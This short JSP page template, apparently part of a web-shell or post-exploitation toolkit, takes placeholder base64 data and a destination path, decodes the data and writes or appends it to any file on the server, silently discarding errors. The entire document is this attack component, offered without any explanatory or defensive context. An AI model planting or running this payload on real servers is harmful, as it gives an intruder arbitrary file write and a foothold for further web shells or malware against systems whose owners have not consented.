<%@ page import="java.util.Base64" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileOutputStream" %>
<%
    String b64 = "%b64%";
    String path = "%destination%";
    String append = "%append%";
    byte[] content = Base64.getDecoder().decode(b64);
    try{
        File file = new File(path);
        FileOutputStream f = null;
        if (append.equals("true")){
            f = new FileOutputStream(file,true);
        }else{
            f = new FileOutputStream(file);
        }
        f.write(content);
        f.close();
    }catch (Exception e){

    }

%>
